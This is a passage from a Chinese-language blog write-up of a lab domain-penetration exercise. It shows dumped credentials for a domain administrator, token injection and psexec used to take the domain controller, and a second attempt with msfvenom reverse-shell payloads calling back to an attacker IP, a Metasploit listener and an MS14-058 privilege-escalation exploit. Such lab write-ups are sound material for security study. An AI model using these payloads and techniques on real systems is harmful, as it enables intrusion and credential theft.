+</span></span><span class=line><span class=cl>	 * Password : 5a a8 6b 7a 0c 89 7d 82 02 3b aa b5 14 80 25 8e 16 21 3d a0 45 ac 96 a2 be 9b d5 6a d1 5b 12 4c 47 fb 97 b1 5b 87 c3 f1 14 87 56 90 0c 1c 80 16 ea de 26 b9 5a 64 61 d0 f1 9a a5 b9 b9 f7 17 f0 d0 98 22 e6 77 cc b2 55 b3 11 39 a2 4c 07 07 1a 38 ca 8d af f7 c8 a1 1d 18 fd 80 34 20 7c 84 3e 4d f3 46 b0 47 d3 2a 97 fd 18 0d 0c 95 d2 ec 87 ba 88 32 da 0f e0 3b c8 d5 0a d3 47 d4 2e 8f 1b 23 41 ff 20 3d 81 f4 5f bf 04 bd 4a d9 4f cd 03 53 24 68 ff 88 23 ad 33 b1 6e 1e 88 b9 1d 1f 3b 72 e3 2e 29 6c f0 ea 77 bd 14 56 5a 3d ba 59 ed 7c ba 98 6e 15 4d 1a d0 97 1d 26 04 88 d2 b5 4c ee fe 09 dc 1c df 76 0c 2e be 09 57 43 b2 c4 9d 39 a4 86 28 df 36 03 48 61 a9 e5 04 4c 41 fe 4a 09 81 33 1d da db 48 5a ed 55 20 53 95 76 9f 3d 
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span></code></pre></div><p>直接抓到了域管理员 <code>SUN\Administrator</code> 的明文密码 <code>dc123.com</code> 和 NTLM 哈希 <code>e8bea972b3549868cecd667a64a6ac46</code>。这意味着已经完全控制域，可以立刻接管域控。</p><p>先创建一个监听器</p><p><img src=https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1iexy5ldlchj31kf0r0dk2.jpg loading=lazy alt=image-20260709173013575></p><p>注入令牌</p><p><img src=https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5l8lwaj31w00mfq8w.jpg loading=lazy alt=image-20260709173137639></p><p>通过<code>psexec</code> 派生会话，等待回连</p><p><img src=https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5l23agj31n605vq5f.jpg loading=lazy alt=image-20260709173232256></p><p>成功拿下域控</p><p><img src=https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1iexy5kxkyhj31v20ny43p.jpg loading=lazy alt=image-20260709173354096></p><p><img src=https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1iexy5krithj30nf0i3ju0.jpg loading=lazy alt=image-20260709173453224></p><p>读取flag</p><p><img src=https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1iexy5kln5nj30tt0553zs.jpg loading=lazy alt=image-20260709173506625></p><h2 id=解法二未成功>解法二（未成功）</h2><p>全程只使用msf</p><p>建立webshell的过程是相同的，直接进行内网渗透</p><p>先用msf生成一个木马</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom -p windows/x64/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>192.168.111.25 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4444</span> -f exe -o exp.exe
+</span></span><span class=line><span class=cl>msfvenom -p windows/meterpreter/reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>192.168.111.25 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4444</span> -f exe -o exp2.exe <span class=c1>#这个更好用</span>
+</span></span></code></pre></div><p><img src=https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5kgcq5j30y905xgoc.jpg loading=lazy alt=image-20260709174458968></p><p>上传<img src=https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1iexy5kcufsj30sv0il0x5.jpg loading=lazy alt=image-20260709174542451></p><p>启动msf监听</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>use exploit/multi/handler
+</span></span><span class=line><span class=cl><span class=nb>set</span> payload windows/meterpreter/reverse_tcp
+</span></span><span class=line><span class=cl><span class=nb>set</span> LHOST 0.0.0.0
+</span></span><span class=line><span class=cl><span class=nb>set</span> LPORT <span class=m>4444</span>
+</span></span><span class=line><span class=cl>run
+</span></span></code></pre></div><p><img src=https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1iexy5k8qggj30gu06r0ue.jpg loading=lazy alt=image-20260709180449290></p><p>拿到shell后查看权限</p><p><img src=https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5k4vutj30vv0kuajs.jpg loading=lazy alt=image-20260709174827666></p><p>查看主机信息</p><p><img src=https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5k06x0j310m0as442.jpg loading=lazy alt=image-20260709175409501></p><p>使用MS14-058提权，用windows/meterpreter/reverse_tcp有一个坏处是默认是32位的payload，后面进行提权的时候要进行进程迁移，以及指定架构</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sessions -i <span class=m>1</span> <span class=c1># 进入会话</span>
+</span></span><span class=line><span class=cl>ps 列出进程
+</span></span><span class=line><span class=cl>migrate &lt;64位进程PID&gt;  <span class=c1># 迁移进程</span>
+</span></span></code></pre></div><p><img src=https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5ju44xj314z0uo4d3.jpg loading=lazy alt=image-20260709181657913></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf exploit<span class=o>(</span>windows/local/ms14_058_track_popup_menu<span class=o>)</span> &gt; show targets
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Exploit targets:
+</span></span><span class=line><span class=cl><span class=o>=================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Id  Name
+</span></span><span class=line><span class=cl>    --  ----
+</span></span><span class=line><span class=cl><span class=o>=</span>&gt;  <span class=m>0</span>   Windows x86
+</span></span><span class=line><span class=cl>    <span class=m>1</span>   Windows x64
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>windows/local/ms14_058_track_popup_menu<span class=o>)</span> &gt; <span class=nb>set</span> target <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=nv>target</span> <span class=o>=</span>&gt; <span class=m>1</span>
+</span></span></code></pre></div><p>但我这里怎么都无法拿到shell，先到此为止了（</p></section><footer class=article-footer><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89%E6%B8%97%E9%80%8F/><div class=article-details><h2 class=article-title>红日靶场（三）渗透</h2></div></a></article><article><a href=/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%97%E9%80%8F/><div class=article-details><h2 class=article-title>红日靶场（一）渗透</h2></div></a></article><article><a href=/p/vulncms-1%E5%A4%8D%E7%8E%B0/><div class=article-details><h2 class=article-title>VulnCMS-1复现</h2></div></a></article><article><a href=/p/zerologon-%E7%BB%83%E4%B9%A0/><div class=article-details><h2 class=article-title>ZeroLogon 练习</h2></div></a></article><article class=has-image><a href=/p/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/><div class=article-image><img src=https://www.ddosi.org/wp-content/uploads/2022/02/24.webp loading=lazy data-key data-hash=https://www.ddosi.org/wp-content/uploads/2022/02/24.webp></div><div class=article-details><h2 class=article-title>渗透攻击学习</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 Oight</section><section class=powerby>Build by Oight<br>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script>(function(){const t=420;function e(){document.querySelectorAll(".article-content .highlight").forEach(function(e){if(e.dataset.codeFoldInit==="true")return;if(e.dataset.codeFoldInit="true",e.scrollHeight<=t+40)return;const s=document.createElement("div");s.className="code-fold-wrapper",e.parentNode.insertBefore(s,e),s.appendChild(e),e.classList.add("code-collapsible","code-collapsed");const n=document.createElement("button");n.type="button",n.className="code-toggle-button",n.textContent="展开代码",n.setAttribute("aria-expanded","false"),n.addEventListener("click",function(){const t=e.classList.toggle("code-collapsed");n.textContent=t?"展开代码":"收起代码",n.setAttribute("aria-expanded",String(!t))}),s.appendChild(n)})}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",e):e()})()</script></body></html>
